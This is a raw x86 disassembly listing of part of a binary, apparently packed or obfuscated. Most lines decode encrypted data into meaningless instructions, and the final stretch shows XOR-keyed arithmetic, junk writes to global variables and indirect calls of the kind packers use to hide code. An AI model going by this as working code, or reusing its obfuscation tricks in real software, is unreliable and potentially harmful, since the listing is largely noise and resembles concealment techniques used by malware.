  403169:	(bad)  
  40316a:	xlat   BYTE PTR ds:[ebx]
  40316b:	mov    ch,0xb6
  40316d:	retf   
  40316e:	xor    bl,BYTE PTR [esp+ebp*8]
  403171:	add    ah,bh
  403173:	sahf   
  403174:	ds loopne 0x403126
  403177:	pop    ds
  403178:	retf   
  403179:	shl    edx,1
  40317b:	pop    eax
  40317c:	and    al,0x9a
  40317e:	sbb    BYTE PTR [edi],0x87
  403181:	xor    DWORD PTR [ecx],0x3d
  403184:	jb     0x4031a2
  403186:	mov    dh,0x5a
  403188:	clc    
  403189:	loope  0x403141
  40318b:	mov    ch,0x75
  40318d:	dec    esp
  40318e:	dec    eax
  40318f:	and    bl,BYTE PTR [edx]
  403191:	and    al,0x88
  403193:	rep ins DWORD PTR es:[edi],dx
  403195:	scas   eax,DWORD PTR es:[edi]
  403196:	mov    BYTE PTR [edx-0x353d4389],0x1
  40319d:	enter  0xfc5a,0xb2
  4031a1:	aas    
  4031a2:	pushf  
  4031a3:	sbb    al,0x1a
  4031a5:	ret    
  4031a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031a7:	(bad)  
  4031a8:	call   0xa6124ae3
  4031ad:	nop
  4031ae:	out    0x47,eax
  4031b0:	xlat   BYTE PTR ds:[ebx]
  4031b1:	stos   DWORD PTR es:[edi],eax
  4031b2:	sbb    DWORD PTR [ebp-0xd043e6e],0xffffff9c
  4031b9:	stc    
  4031ba:	xor    ah,BYTE PTR [ebp-0x28]
  4031bd:	inc    ecx
  4031be:	inc    esp
  4031bf:	jno    0x4031de
  4031c1:	xchg   edi,eax
  4031c2:	jmp    0xf93ca4d1
  4031c7:	scas   eax,DWORD PTR es:[edi]
  4031c8:	adc    DWORD PTR [ebp-0x1e],edi
  4031cb:	into   
  4031cc:	mov    ebp,0x349de4ef
  4031d1:	test   BYTE PTR [esi-0x54],ah
  4031d4:	cli    
  4031d5:	(bad)  
  4031d6:	out    dx,al
  4031d7:	stos   DWORD PTR es:[edi],eax
  4031d8:	push   ss
  4031d9:	cdq    
  4031da:	scas   eax,DWORD PTR es:[edi]
  4031db:	xor    ah,BYTE PTR [edi-0x77b63b3f]
  4031e1:	test   eax,0x774595e2
  4031e6:	repnz test al,0x45
  4031e9:	aad    0xdc
  4031eb:	sar    DWORD PTR [ecx+0x181812f0],1
  4031f1:	mov    dh,0x1e
  4031f3:	clc    
  4031f4:	rcr    DWORD PTR [edx*8-0x37d37ead],1
  4031fb:	test   BYTE PTR [ecx+0x4a],0xfa
  4031ff:	ins    DWORD PTR es:[edi],dx
  403200:	scas   eax,DWORD PTR es:[edi]
  403201:	scas   eax,DWORD PTR es:[edi]
  403202:	pop    ds
  403203:	jae    0x403258
  403205:	rcr    BYTE PTR [edx+0xb],0xc2
  403209:	rdtsc  
  40320b:	jno    0x40321b
  40320d:	xchg   ebx,eax
  40320e:	adc    DWORD PTR [edi+0x62],edi
  403211:	mov    esp,0x3c110762
  403216:	leave  
  403217:	mov    gs,WORD PTR [ebp-0x3cb06a3b]
  40321d:	rcr    ebx,0x91
  403220:	pop    ecx
  403221:	jns    0x4031d5
  403223:	cmp    ch,BYTE PTR [ebx+0x41d50951]
  403229:	pop    ecx
  40322a:	leave  
  40322b:	jg     0x403275
  40322d:	push   esi
  40322e:	in     eax,dx
  40322f:	popf   
  403230:	inc    edi
  403231:	lahf   
  403232:	rcr    BYTE PTR [ebp+0x57],1
  403235:	inc    ecx
  403236:	in     eax,0x2c
  403238:	mov    ah,0x92
  40323a:	push   edx
  40323b:	and    BYTE PTR [ecx-0x18d8e828],dl
  403241:	int    0x66
  403243:	imul   esp,DWORD PTR [ecx-0x23],0x7b4ca91c
  40324a:	mov    ebp,0xcef6357c
  40324f:	mov    al,0x7e
  403251:	jne    0x403289
  403253:	shl    BYTE PTR [ecx],0x77
  403256:	xor    bl,dh
  403258:	dec    edi
  403259:	test   BYTE PTR [eax],dh
  40325b:	sbb    al,0x1a
  40325d:	icebp  
  40325e:	ins    BYTE PTR es:[edi],dx
  40325f:	cwde   
  403260:	mov    BYTE PTR [edx+0x2d4fa971],bl
  403266:	in     eax,0x19
  403268:	(bad)  
  403269:	leave  
  40326a:	add    dh,BYTE PTR [edx]
  40326c:	outs   dx,BYTE PTR ds:[esi]
  40326d:	fstp   TBYTE PTR [ecx+edi*1+0x55ef7a84]
  403274:	adc    BYTE PTR [esi],cl
  403276:	ss aaa 
  403278:	sbb    al,0xbc
  40327a:	cmp    DWORD PTR [edx+0x74a79215],edx
  403280:	xchg   ecx,ecx
  403282:	outs   dx,DWORD PTR ds:[esi]
  403283:	lds    edi,FWORD PTR [esi+esi*8]
  403286:	addr16 lock lock mov edi,0xb9904ffb
  40328e:	outs   dx,DWORD PTR ds:[esi]
  40328f:	in     al,dx
  403290:	pop    es
  403291:	ja     0x403216
  403293:	mov    eax,0x40210cac
  403298:	ins    DWORD PTR es:[edi],dx
  403299:	mov    ds:0x404ce0b4,al
  40329e:	fs xchg ecx,eax
  4032a0:	das    
  4032a1:	ins    DWORD PTR es:[edi],dx
  4032a2:	sbb    al,BYTE PTR [edi-0x36790329]
  4032a8:	mov    dh,BYTE PTR [eax+0x17]
  4032ab:	gs pop eax
  4032ad:	jno    0x4032f2
  4032af:	mov    edi,0x16fd3f66
  4032b4:	cmp    eax,ebp
  4032b6:	loop   0x4032ba
  4032b8:	mov    eax,ds:0x1742f81a
  4032bd:	sbb    ch,BYTE PTR ds:0xc87b8f39
  4032c3:	enter  0xab7a,0x93
  4032c7:	push   0x8518e80e
  4032cc:	in     al,0x95
  4032ce:	cmp    eax,0x8679764d
  4032d3:	pushf  
  4032d4:	inc    ebp
  4032d5:	scas   al,BYTE PTR es:[edi]
  4032d6:	repnz aas 
  4032d8:	dec    esp
  4032d9:	call   0x4bb1:0xdccf8953
  4032e0:	mov    ecx,0xfdf3b63a
  4032e5:	dec    edx
  4032e6:	jo     0x403270
  4032e8:	cli    
  4032e9:	mov    al,0xb7
  4032eb:	dec    ebp
  4032ec:	outs   dx,DWORD PTR ds:[esi]
  4032ed:	cmp    DWORD PTR [edi+edi*2],ebp
  4032f0:	push   ds
  4032f1:	fdiv   QWORD PTR [esp+eax*8]
  4032f4:	mov    ebx,0x78d16764
  4032f9:	scas   eax,DWORD PTR es:[edi]
  4032fa:	xchg   esp,eax
  4032fb:	xor    edi,DWORD PTR [eax+eiz*2-0x3]
  4032ff:	xchg   DWORD PTR [esi],edi
  403301:	repz pop ebp
  403303:	daa    
  403304:	loopne 0x403375
  403306:	fstp   TBYTE PTR [eax]
  403308:	adc    BYTE PTR [eax+esi*2-0x5c],al
  40330c:	cmp    ah,BYTE PTR [ebp-0x5a]
  40330f:	and    DWORD PTR [esi-0xb587c26],esi
  403315:	push   ss
  403316:	icebp  
  403317:	ds push ds
  403319:	popf   
  40331a:	jae    0x403327
  40331c:	sbb    DWORD PTR [di],edx
  40331f:	ins    BYTE PTR es:[edi],dx
  403320:	jne    0x4032f6
  403322:	fcomp  QWORD PTR [edi]
  403324:	mul    dl
  403326:	pop    ecx
  403327:	fsubr  st(0),st
  403329:	fbstp  TBYTE PTR [eax]
  40332b:	add    eax,0x5ee2f8c0
  403330:	cmp    ecx,DWORD PTR [ecx+0x2e8a25c6]
  403336:	mov    cl,0x4f
  403338:	push   ds
  403339:	in     eax,0x51
  40333b:	ret    
  40333c:	stos   BYTE PTR es:[edi],al
  40333d:	int    0x58
  40333f:	test   BYTE PTR [ebp+0x1d72f8d5],bl
  403345:	retf   0xdc5b
  403348:	adc    ebp,DWORD PTR [ebx]
  40334a:	mov    ecx,0x1bc15543
  40334f:	paddb  mm2,QWORD PTR [edx]
  403352:	inc    esp
  403353:	iret   
  403354:	push   edi
  403355:	xlat   BYTE PTR ds:[ebx]
  403356:	scas   al,BYTE PTR es:[edi]
  403357:	push   cs
  403358:	(bad)  
  403359:	jmp    0x40330a
  40335b:	mov    dl,0x7e
  40335d:	es cmp eax,0x5e6b5273
  403363:	(bad)  
  403364:	mov    ecx,0x89539bc8
  403369:	push   esi
  40336a:	stc    
  40336b:	dec    DWORD PTR [edi+eiz*8-0x25]
  40336f:	stc    
  403370:	addr16 enter 0xe37f,0x40
  403375:	ret    0x77e3
  403378:	sub    BYTE PTR [ecx-0x38],dl
  40337b:	ret    
  40337c:	mov    dl,BYTE PTR [ebx]
  40337e:	js     0x4033d4
  403380:	cmp    edi,DWORD PTR [ecx+eax*1-0x75]
  403384:	and    eax,DWORD PTR [esp+ebp*4]
  403387:	popf   
  403388:	jns    0x403349
  40338a:	inc    ecx
  40338b:	je     0x4033b2
  40338d:	inc    ebx
  40338e:	popa   
  40338f:	dec    eax
  403390:	jecxz  0x40337c
  403392:	and    ebp,DWORD PTR ds:0x9d54e0c2
  403398:	gs add ah,ah
  40339b:	in     al,0xd7
  40339d:	fisub  WORD PTR ds:0xdedbc353
  4033a3:	jmp    0x40339f
  4033a5:	in     al,0x8e
  4033a7:	rdpmc  
  4033a9:	inc    ebx
  4033aa:	pop    ss
  4033ab:	shl    dh,0x7d
  4033ae:	add    DWORD PTR [ecx+0x538d5aae],ebx
  4033b4:	xor    DWORD PTR [edi-0x44da119c],ecx
  4033ba:	pop    ss
  4033bb:	fstp   QWORD PTR [eax+0xdcf07fb]
  4033c1:	or     dh,cl
  4033c3:	out    0xc7,eax
  4033c5:	arpl   WORD PTR [esi-0x6],ax
  4033c8:	xor    cl,BYTE PTR [ecx+0x7e]
  4033cb:	or     eax,0x2c450f06
  4033d0:	pop    ecx
  4033d1:	push   0xffffffbd
  4033d3:	jp     0x4033b7
  4033d5:	jmp    0x2193:0x6f6bddaa
  4033dc:	je     0x403364
  4033de:	arpl   ax,bp
  4033e0:	and    BYTE PTR [edi+0xe],bh
  4033e3:	xchg   edi,eax
  4033e4:	mov    ecx,0xc99f7e0c
  4033e9:	pushf  
  4033ea:	lds    ebx,FWORD PTR [edi-0x7]
  4033ed:	daa    
  4033ee:	test   BYTE PTR [ebp-0x2bc6384c],cl
  4033f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033f5:	mov    cl,0x8
  4033f7:	and    BYTE PTR ds:0x9afff874,dl
  4033fd:	mov    dh,0xdd
  4033ff:	rcl    DWORD PTR [ebp-0x95ee811],0x17
  403406:	mov    ebx,0x87a20b0d
  40340b:	sbb    ch,BYTE PTR [esp+edi*4]
  40340e:	out    0xb3,al
  403410:	ins    BYTE PTR es:[edi],dx
  403411:	cdq    
  403412:	dec    edi
  403413:	jmp    0xa046:0x93c7087d
  40341a:	jmp    0x403436
  40341c:	movzx  ebp,cl
  40341f:	or     bh,dl
  403421:	jne    0x403482
  403423:	sbb    DWORD PTR ds:0x954072b4,edx
  403429:	mov    bh,ch
  40342b:	mov    ch,0x85
  40342d:	dec    ecx
  40342e:	and    eax,0x2ca01a18
  403433:	rcr    DWORD PTR [esi-0x769ea8a4],0x5b
  40343a:	(bad)  
  40343b:	mov    esp,0xfbc07069
  403440:	pop    ebp
  403441:	addr16 popa 
  403443:	loope  0x4033f2
  403445:	pop    ebp
  403446:	fcom   QWORD PTR [esi]
  403448:	aam    0xc2
  40344a:	stc    
  40344b:	lods   al,BYTE PTR ds:[esi]
  40344c:	dec    ebp
  40344d:	pushf  
  40344e:	jb     0x403448
  403450:	and    BYTE PTR [edi],dl
  403452:	std    
  403453:	sbb    bh,BYTE PTR [ebx+0x686928df]
  403459:	retf   0x3787
  40345c:	das    
  40345d:	out    dx,eax
  40345e:	mov    esp,0x55a2bf7
  403463:	aaa    
  403464:	lds    ebp,FWORD PTR [ebp+eiz*1+0x62]
  403468:	outs   dx,DWORD PTR ds:[esi]
  403469:	pop    ebx
  40346a:	cmc    
  40346b:	dec    esi
  40346c:	add    BYTE PTR [ebx*1+0x1ec6f584],ah
  403473:	xor    BYTE PTR ds:0xb45404dd,bh
  403479:	(bad)  
  40347a:	or     al,0xf
  40347c:	cwde   
  40347d:	xlat   BYTE PTR ds:[ebx]
  40347e:	push   edi
  40347f:	call   0xf9787e55
  403484:	outs   dx,DWORD PTR ds:[esi]
  403485:	mov    ds:0xe62dc190,al
  40348a:	iret   
  40348b:	sub    BYTE PTR [ebp+0x4b2e5528],0x46
  403492:	mov    esi,0x5bacdf73
  403497:	add    al,0x43
  403499:	mov    esp,ecx
  40349b:	fild   WORD PTR [eax+0x7591c44b]
  4034a1:	in     al,0xb5
  4034a3:	xchg   edx,eax
  4034a4:	or     esi,DWORD PTR [eax]
  4034a6:	pushf  
  4034a7:	into   
  4034a8:	cli    
  4034a9:	ret    0x79f5
  4034ac:	inc    ebx
  4034ad:	rcl    DWORD PTR [esi-0x499930ee],0x2a
  4034b4:	rcl    DWORD PTR [ebx],cl
  4034b6:	sub    al,0x54
  4034b8:	sub    BYTE PTR [ecx],dh
  4034ba:	clc    
  4034bb:	lock repz adc dl,BYTE PTR [eax-0x5e84ac7a]
  4034c3:	adc    al,0x7e
  4034c5:	and    dh,ch
  4034c7:	outs   dx,DWORD PTR ds:[esi]
  4034c8:	imul   esi,DWORD PTR [edi+ebx*4+0x2b5bf9ca],0xd15ed3af
  4034d3:	icebp  
  4034d4:	jno    0x4034b8
  4034d6:	frstor [ebx+0x75572092]
  4034dc:	xchg   esi,eax
  4034dd:	jp     0x4034b5
  4034df:	sbb    cl,bh
  4034e1:	icebp  
  4034e2:	lahf   
  4034e3:	jmp    0x53de87bf
  4034e8:	add    esi,edi
  4034ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034eb:	fcomp  DWORD PTR [ebp+0x46]
  4034ee:	ret    0x64d1
  4034f1:	pop    eax
  4034f2:	inc    edx
  4034f3:	jle    0x4034d9
  4034f5:	jle    0x40350e
  4034f7:	jno    0x403489
  4034f9:	cmp    al,0xf4
  4034fb:	adc    dh,bl
  4034fd:	mov    ebx,0x855c966a
  403502:	cwde   
  403503:	or     al,0xd
  403505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403506:	and    al,0xe7
  403508:	in     eax,dx
  403509:	and    bl,BYTE PTR [edi-0x6ac64eea]
  40350f:	sbb    DWORD PTR [ebp+0x19],edi
  403512:	cld    
  403513:	xor    ebp,ebp
  403515:	cdq    
  403516:	ficom  WORD PTR [ecx+0x22]
  403519:	add    al,0xd0
  40351b:	nop
  40351c:	outs   dx,BYTE PTR ds:[esi]
  40351d:	shr    BYTE PTR [eax+0x26],0xe7
  403521:	ins    DWORD PTR es:[edi],dx
  403522:	add    edi,ebp
  403524:	push   0x6f
  403526:	fdivr  DWORD PTR [ecx-0x5ccd5b7a]
  40352c:	daa    
  40352d:	cmp    DWORD PTR [eax-0x1c],edx
  403530:	add    al,bl
  403532:	xor    bh,dh
  403534:	mov    bh,0xc7
  403536:	adc    BYTE PTR [edx+0x60ad45a4],dh
  40353c:	pop    esi
  40353d:	ss and ebp,eax
  403540:	push   0x53d39f38
  403545:	outs   dx,BYTE PTR ds:[esi]
  403546:	out    dx,al
  403547:	aas    
  403548:	clc    
  403549:	in     eax,dx
  40354a:	cmp    edi,0xffffffa9
  40354d:	mov    edi,0x69ba1543
  403552:	push   ebp
  403553:	sub    eax,0x94583618
  403558:	cmp    DWORD PTR [ebp+0x16],0x267204a2
  40355f:	popa   
  403560:	fimul  WORD PTR [edx+0x11]
  403563:	aas    
  403564:	pop    ds
  403565:	(bad)  
  403566:	mov    al,0x46
  403568:	aas    
  403569:	or     ebp,DWORD PTR ds:0xb079cfba
  40356f:	xchg   edi,eax
  403570:	sub    al,BYTE PTR [eax-0x5ef4020d]
  403576:	ja     0x4035cc
  403578:	push   cs
  403579:	mov    DWORD PTR [esi+0x4e],ebx
  40357c:	sbb    al,0x9f
  40357e:	loope  0x403568
  403580:	jmp    0x4035a7
  403582:	xor    DWORD PTR [edx-0x1e9be64d],ebp
  403588:	sub    eax,0x4de7ba3f
  40358d:	out    0xc8,eax
  40358f:	repnz mov al,ds:0xe29132cc
  403595:	das    
  403596:	and    al,0x4e
  403598:	fbld   TBYTE PTR [edx]
  40359a:	jb     0x4035eb
  40359c:	in     al,0x2f
  40359e:	jecxz  0x4035e3
  4035a0:	push   0x7
  4035a2:	mov    edx,0x842a9e83
  4035a7:	mov    ebx,ecx
  4035a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035aa:	(bad)  
  4035ab:	xchg   esi,eax
  4035ac:	adc    bl,al
  4035ae:	ins    BYTE PTR es:[edi],dx
  4035af:	sbb    eax,0x3f22319f
  4035b4:	or     esi,DWORD PTR [ecx]
  4035b6:	push   esi
  4035b7:	jmp    0xa4a2f8ee
  4035bc:	lods   al,BYTE PTR ds:[esi]
  4035bd:	inc    esi
  4035be:	call   0xfcee9130
  4035c3:	mov    bh,0xc4
  4035c5:	add    al,0xaa
  4035c7:	mov    ds:0xa417e9f3,al
  4035cc:	retf   0xaf77
  4035cf:	daa    
  4035d0:	inc    edx
  4035d1:	js     0x4035fb
  4035d3:	cmp    BYTE PTR [edi+0x1c],bh
  4035d6:	mov    edx,0x980f22e0
  4035db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035dc:	cmp    al,0xc0
  4035de:	ficomp WORD PTR [eax-0x67]
  4035e1:	mov    edx,0xe21b3fd7
  4035e6:	repnz push ds
  4035e8:	push   es
  4035e9:	cld    
  4035ea:	loope  0x403592
  4035ec:	mov    bh,0xd7
  4035ee:	test   DWORD PTR [ebx+0x1c],edx
  4035f1:	mov    al,0xbf
  4035f3:	call   0xf32e4ca
  4035f8:	jl     0x4035e5
  4035fa:	adc    eax,0x929ec2de
  4035ff:	jecxz  0x4035c2
  403601:	adc    eax,0x15e01bc8
  403606:	inc    ebp
  403607:	repz int3 
  403609:	ficomp DWORD PTR [ebx+eax*1]
  40360c:	(bad)  [edx]
  40360e:	xlat   BYTE PTR ds:[ebx]
  40360f:	lea    ebp,[eax+0x5e]
  403612:	or     eax,DWORD PTR [edx+0x38]
  403615:	adc    eax,0xcf134a22
  40361a:	and    al,0x9a
  40361c:	ret    
  40361d:	out    0xcd,eax
  40361f:	aam    0x34
  403621:	stc    
  403622:	pop    esp
  403623:	mov    DWORD PTR [ecx+0x5bea1ed2],eax
  403629:	or     BYTE PTR [ecx-0x66b8ef70],ch
  40362f:	pop    ebx
  403630:	jmp    0xb21de662
  403635:	add    bh,ah
  403637:	iretw  
  403639:	stos   DWORD PTR es:[edi],eax
  40363a:	ror    BYTE PTR [ebp+0x542e1204],cl
  403640:	adc    dl,BYTE PTR ss:[ebx+0x7273fd48]
  403647:	mov    ?,ecx
  403649:	cmp    BYTE PTR [ebx+0x5e],bh
  40364c:	rcr    edi,1
  40364e:	xchg   ch,ah
  403650:	sbb    BYTE PTR [eax],0xa2
  403653:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  403655:	xor    esp,ebp
  403657:	inc    esi
  403658:	(bad)  
  40365a:	ins    BYTE PTR es:[edi],dx
  40365b:	je     0x403670
  40365d:	jmp    0x5102a923
  403662:	(bad)  
  403663:	cli    
  403664:	enter  0xc07f,0xb2
  403668:	lahf   
  403669:	or     ch,BYTE PTR [edx-0x1d]
  40366c:	sub    ebp,esi
  40366e:	fcom   QWORD PTR [ebp+0xe8993a6]
  403674:	pusha  
  403675:	mov    dh,0x50
  403677:	nop
  403678:	stos   BYTE PTR es:[edi],al
  403679:	ins    BYTE PTR es:[edi],dx
  40367a:	in     al,0x63
  40367c:	daa    
  40367d:	ja     0x4036be
  40367f:	sub    bl,al
  403681:	pop    ss
  403682:	push   0xfffffff7
  403684:	sub    BYTE PTR [ebx-0x73c6cf40],bh
  40368a:	add    DWORD PTR [edx+0x20],eax
  40368d:	jno    0x403688
  40368f:	push   0x22
  403691:	adc    BYTE PTR [edi],ah
  403693:	pop    edx
  403694:	clc    
  403695:	push   0x12329180
  40369a:	in     al,dx
  40369b:	mov    WORD PTR [ecx-0x1bdf40f],gs
  4036a1:	mov    ebx,0xa99f78b7
  4036a6:	scas   al,BYTE PTR es:[edi]
  4036a7:	xor    BYTE PTR ds:[ecx+edi*4-0x4da03e0],ch
  4036af:	call   0xf1d5:0x29cf1819
  4036b6:	jae    0x4036a0
  4036b8:	loopne 0x4036cf
  4036ba:	adc    dh,BYTE PTR [edi+0x72]
  4036bd:	pop    ss
  4036be:	sub    BYTE PTR [ebx+0x7],dl
  4036c1:	imul   ah
  4036c3:	out    dx,eax
  4036c4:	sbb    DWORD PTR [esi-0x1c],ebp
  4036c7:	mov    edx,0x79106d37
  4036cc:	call   0xc385591f
  4036d1:	xor    al,0x58
  4036d3:	or     ah,dh
  4036d5:	pop    ds
  4036d6:	add    al,0xdd
  4036d8:	cmp    DWORD PTR [edi],eax
  4036da:	push   ss
  4036db:	(bad)  
  4036dc:	cli    
  4036dd:	jp     0x40369a
  4036df:	pop    eax
  4036e0:	fisub  DWORD PTR [edi+ebp*2-0x65]
  4036e4:	in     eax,0xb0
  4036e6:	mov    esp,0xa303b216
  4036eb:	xor    al,0xa8
  4036ed:	sub    BYTE PTR [eax-0x11],dl
  4036f0:	mov    DWORD PTR [ecx+0xe],edx
  4036f3:	hlt    
  4036f4:	xor    dl,BYTE PTR ds:0x4344191e
  4036fa:	dec    esi
  4036fb:	pushf  
  4036fc:	(bad)  
  4036fd:	mov    eax,ds:0x7329a9bc
  403702:	fadd   DWORD PTR [ebx]
  403704:	sbb    ecx,edx
  403706:	scas   eax,DWORD PTR es:[edi]
  403707:	and    ch,BYTE PTR [ebx+eiz*4-0x76269d08]
  40370e:	cmp    DWORD PTR [esi+0x553d2529],0xd767714c
  403718:	push   ds
  403719:	push   edi
  40371a:	push   esi
  40371b:	mov    ch,0x8c
  40371d:	mov    ebp,0x3314ccfe
  403722:	sbb    al,0x11
  403724:	fmul   QWORD PTR [esi]
  403727:	cmp    DWORD PTR [edx+0x38],ecx
  40372a:	rcr    BYTE PTR [ebx],0xf1
  40372d:	push   0x44
  40372f:	and    dl,BYTE PTR [ecx+0x36]
  403732:	sti    
  403733:	jg     0x4036c6
  403735:	cdq    
  403736:	dec    ebp
  403737:	je     0x40372a
  403739:	xchg   esp,eax
  40373a:	mov    ah,0x8d
  40373c:	jle    0x4036ea
  40373e:	jns    0x40370c
  403740:	stc    
  403741:	jnp    0x40377b
  403743:	lahf   
  403744:	js     0x40376e
  403746:	pop    esp
  403747:	mov    al,BYTE PTR [ebx-0x22748eb2]
  40374d:	(bad)  
  40374e:	cmp    esi,DWORD PTR [eax]
  403750:	das    
  403751:	icebp  
  403752:	sbb    al,0x73
  403754:	icebp  
  403755:	stc    
  403756:	outs   dx,DWORD PTR ds:[esi]
  403757:	push   esp
  403758:	mov    eax,ds:0xa33e201d
  40375d:	std    
  40375e:	sbb    DWORD PTR [esi+ebx*1+0x6ce805fd],esp
  403765:	imul   eax,DWORD PTR [eax],0xadc149bb
  40376b:	fmul   st(7),st
  40376d:	sub    DWORD PTR [edi-0x4240871f],ebp
  403773:	pop    ecx
  403774:	ja     0x403709
  403776:	pop    ebp
  403777:	hlt    
  403778:	push   0x6ccf5f61
  40377d:	and    DWORD PTR [ebp+0x11],esp
  403780:	add    cl,0xb5
  403783:	dec    edx
  403784:	adc    DWORD PTR [ecx],eax
  403786:	jg     0x4037f9
  403788:	jle    0x4037a7
  40378a:	lods   eax,DWORD PTR ds:[esi]
  40378b:	adc    eax,0x97d7adde
  403790:	ins    BYTE PTR es:[edi],dx
  403791:	xlat   BYTE PTR ds:[ebx]
  403792:	mov    eax,0xfc27cc2b
  403797:	pop    eax
  403798:	imul   edx,DWORD PTR [edi],0xffffffa9
  40379b:	cs jo  0x40374b
  40379e:	cmp    eax,0x4e93f9de
  4037a3:	xor    BYTE PTR [ebp-0x71e01066],0x5
  4037aa:	out    dx,eax
  4037ab:	mov    edi,0x15c38976
  4037b0:	xlat   BYTE PTR ds:[ebx]
  4037b1:	mov    BYTE PTR [esi+0x31],bl
  4037b4:	sub    al,0x76
  4037b6:	jno    0x40379c
  4037b8:	add    eax,0x1a220a2a
  4037bd:	fistp  WORD PTR [edx]
  4037bf:	cmp    bl,bh
  4037c1:	mov    dh,0x3f
  4037c3:	fldcw  WORD PTR [ebx+ebp*2+0x76]
  4037c7:	adc    al,0xb7
  4037c9:	dec    eax
  4037ca:	call   ebx
  4037cc:	ja     0x4037bb
  4037ce:	mov    cl,0x44
  4037d0:	xlat   BYTE PTR ds:[ebx]
  4037d1:	xor    eax,0x17aef92
  4037d6:	pop    ebx
  4037d7:	dec    edx
  4037d8:	icebp  
  4037d9:	std    
  4037da:	out    0x26,al
  4037dc:	fbstp  TBYTE PTR [esi+0x2692b0ab]
  4037e2:	mov    eax,ds:0x15184de4
  4037e7:	test   al,0x85
  4037e9:	pop    edi
  4037ea:	xor    ch,dh
  4037ec:	in     al,0x7e
  4037ee:	shl    DWORD PTR [edx+0x135ffae3],1
  4037f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037f5:	adc    al,0xbf
  4037f7:	test   eax,0xd53e488c
  4037fc:	push   edi
  4037fd:	jne    0x403861
  4037ff:	cmp    BYTE PTR [ebp+0x4c],ch
  403802:	shl    BYTE PTR [eax-0x7c],cl
  403805:	into   
  403806:	and    esi,DWORD PTR [bx]
  403809:	jb     0x403790
  40380b:	cdq    
  40380c:	sbb    DWORD PTR [eax],ebx
  40380e:	lahf   
  40380f:	jbe    0x403833
  403811:	mov    bh,0x9b
  403813:	repnz adc DWORD PTR [ebx+0x4d8bf045],ecx
  40381a:	lock xor eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42a9eb
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42a9ef
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
